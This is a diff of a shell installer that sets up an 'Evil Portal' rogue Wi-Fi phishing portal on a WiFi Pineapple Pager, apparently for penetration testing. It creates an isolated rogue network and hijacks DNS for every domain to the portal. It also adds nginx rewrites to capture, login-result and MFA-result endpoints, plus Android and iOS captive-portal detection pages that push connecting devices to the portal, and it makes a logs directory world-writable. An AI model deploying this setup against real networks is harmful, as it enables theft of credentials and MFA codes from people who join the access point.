@@ -2,7 +2,7 @@
 # Name: Install Evil Portal on Pager
 # Description: Complete Evil Portal installation for WiFi Pineapple Pager (OpenWrt 24.10.1)
 # Author: PentestPlaybook
-# Version: 1.4
+# Version: 1.5
 # Category: Evil Portal
 
 # ====================================================================
@@ -19,9 +19,9 @@ if [ "$DIALOG_RESULT" = "1" ]; then
     LOG "Configuring Isolated Evil Network..."
     LOG "=============================================="
     
-    # Add evil network configuration
+    # Add evil network configuration with wlan0wpa as bridge port
     LOG "Creating br-evil bridge and interface..."
-    echo -e "\nconfig device\n        option name 'br-evil'\n        option type 'bridge'\n\nconfig interface 'evil'\n        option device 'br-evil'\n        option proto 'static'\n        option ipaddr '10.0.0.1'\n        option netmask '255.255.255.0'" >> /etc/config/network
+    echo -e "\nconfig device\n        option name 'br-evil'\n        option type 'bridge'\n        list ports 'wlan0wpa'\n\nconfig interface 'evil'\n        option device 'br-evil'\n        option proto 'static'\n        option ipaddr '10.0.0.1'\n        option netmask '255.255.255.0'" >> /etc/config/network
     
     # Add DHCP configuration for evil network
     LOG "Configuring DHCP for evil network..."
@@ -29,11 +29,13 @@ if [ "$DIALOG_RESULT" = "1" ]; then
     
     # Assign wlan0wpa to evil network
     LOG "Assigning wlan0wpa to evil network..."
-    sed -i "/config wifi-iface 'wlan0wpa'/,/option ifname/ s/\(option ifname 'wlan0wpa'\)/\1\n        option network 'evil'/" /etc/config/wireless
+    uci set wireless.wlan0wpa.network='evil'
+    uci commit wireless
     
     # Remove wlan0wpa from br-lan bridge
     LOG "Removing wlan0wpa from br-lan..."
-    sed -i "/list ports 'wlan0wpa'/d" /etc/config/network
+    uci del_list network.brlan.ports='wlan0wpa'
+    uci commit network
     
     # Add evil network to LAN firewall zone for internet access
     LOG "Adding evil network to firewall..."
@@ -256,10 +258,10 @@ LOG "SUCCESS: API files created"
 # STEP 3: Create Portal Files
 # ====================================================================
 LOG "Step 3: Creating portal interface files..."
-mkdir -p /root/portals/Wordpress
+mkdir -p /root/portals/Default
 
 LOG "Creating index.php..."
-cat > /root/portals/Wordpress/index.php << 'EOF'
+cat > /root/portals/Default/index.php << 'EOF'
 <?php
 
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
@@ -302,7 +304,7 @@ require_once('helper.php');
 EOF
 
 LOG "Creating MyPortal.php..."
-cat > /root/portals/Wordpress/MyPortal.php << 'EOF'
+cat > /root/portals/Default/MyPortal.php << 'EOF'
 <?php namespace evilportal;
 
 class MyPortal extends Portal
@@ -331,7 +333,7 @@ class MyPortal extends Portal
 EOF
 
 LOG "Creating helper.php..."
-cat > /root/portals/Wordpress/helper.php << 'EOF'
+cat > /root/portals/Default/helper.php << 'EOF'
 <?php
 
 function getClientMac($clientIP)
@@ -364,12 +366,40 @@ function getClientHostName($clientIP)
 }
 EOF
 
-LOG "Creating Wordpress.ep..."
-cat > /root/portals/Wordpress/Wordpress.ep << 'EOF'
+LOG "Creating Default.ep..."
+cat > /root/portals/Default/Default.ep << 'EOF'
 {
-  "name": "Wordpress",
+  "name": "Default",
   "type": "basic"
 }
+EOF
+
+LOG "Creating generate_204.html (Android)..."
+cat > /root/portals/Default/generate_204.html << EOF
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/">
+    <script>window.location.href="http://${PORTAL_IP}/";</script>
+</head>
+<body>
+    <a href="http://${PORTAL_IP}/">Sign in to network</a>
+</body>
+</html>
+EOF
+
+LOG "Creating hotspot-detect.html (iOS/macOS)..."
+cat > /root/portals/Default/hotspot-detect.html << EOF
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/">
+    <script>window.location.href="http://${PORTAL_IP}/";</script>
+</head>
+<body>
+    <a href="http://${PORTAL_IP}/">Sign in to network</a>
+</body>
+</html>
 EOF
 
 LOG "SUCCESS: Portal files created"
@@ -400,7 +430,6 @@ http {
         server {
                 listen       80;
                 server_name  www;
-                error_page 404 =200 /index.php;
                 error_log /root/elog;
                 access_log /dev/null;
                 fastcgi_connect_timeout 300;
@@ -416,15 +445,18 @@ http {
                 output_buffers 1 32k;
                 postpone_output 1460;
                 root   /www;
+
+                rewrite ^/capture$ /helper.php last;
+                rewrite ^/mfa_result$ /mfa_result.php last;
+                rewrite ^/mfa_status$ /mfa_status.php last;
+                rewrite ^/login_result$ /login_result.php last;
+
                 location ~ \.php$ {
                         fastcgi_split_path_info ^(.+\.php)(/.+)$;
                         fastcgi_pass unix:/var/run/php8-fpm.sock;
                         fastcgi_index index.php;
                         include fastcgi_params;
                         fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
-                        if (-f $request_filename) {
-                                fastcgi_pass    unix:/var/run/php8-fpm.sock;
-                        }
                 }
                 error_page 404 =200 /index.php;
         }
@@ -449,6 +481,10 @@ uci commit nginx
 
 chmod 755 /root
 chmod -R 755 /root/portals/
+
+# Create logs directory with write permissions for PHP-FPM (runs as nobody)
+mkdir -p /root/logs
+chmod 777 /root/logs
 
 LOG "SUCCESS: Permissions configured"
 
@@ -520,10 +556,11 @@ start_services() {
     dnsmasq --no-hosts --no-resolv --address=/#/${PORTAL_IP} -p 5353 &
     rm -f /www/captiveportal
     ln -s /pineapple/ui/modules/evilportal/assets/api /www/captiveportal
-    ln -sf /root/portals/Wordpress/index.php /www/index.php
-    ln -sf /root/portals/Wordpress/MyPortal.php /www/MyPortal.php
-    ln -sf /root/portals/Wordpress/helper.php /www/helper.php
-    ln -sf /root/portals/Wordpress/index.php /www/generate_204
+    ln -sf /root/portals/Default/index.php /www/index.php
+    ln -sf /root/portals/Default/MyPortal.php /www/MyPortal.php
+    ln -sf /root/portals/Default/helper.php /www/helper.php
+	ln -sf /root/portals/Default/generate_204.html /www/generate_204
+    ln -sf /root/portals/Default/hotspot-detect.html /www/hotspot-detect.html
 
     # Start whitelist daemon
     /usr/bin/evilportal-whitelist-daemon &
@@ -535,7 +572,7 @@ stop_services() {
     /etc/init.d/nginx stop
     kill \$(netstat -plant 2>/dev/null | grep ':5353' | awk '{print \$NF}' | sed 's/\/dnsmasq//g') 2>/dev/null
     killall evilportal-whitelist-daemon 2>/dev/null
-    rm -f /www/captiveportal /www/index.php /www/MyPortal.php /www/helper.php /www/generate_204
+    rm -f /www/captiveportal /www/index.php /www/MyPortal.php /www/helper.php /www/generate_204 /www/hotspot-detect.html
 
     # Remove whitelist rules
     remove_whitelist_rules
@@ -821,7 +858,7 @@ LOG "  - nginx: $(pgrep nginx > /dev/null && echo 'Running' || echo 'Stopped')"
 LOG "  - dnsmasq (5353): $(pgrep -f 'dnsmasq.*5353' > /dev/null && echo 'Running' || echo 'Stopped')"
 LOG "  - Whitelist Daemon: $(pgrep -f evilportal-whitelist-daemon > /dev/null && echo 'Running' || echo 'Stopped')"
 LOG ""
-LOG "Portal files: /root/portals/Wordpress/"
+LOG "Portal files: /root/portals/Default/"
 LOG "API files: /pineapple/ui/modules/evilportal/assets/api/"
 LOG "Init script: /etc/init.d/evilportal"
 LOG ""
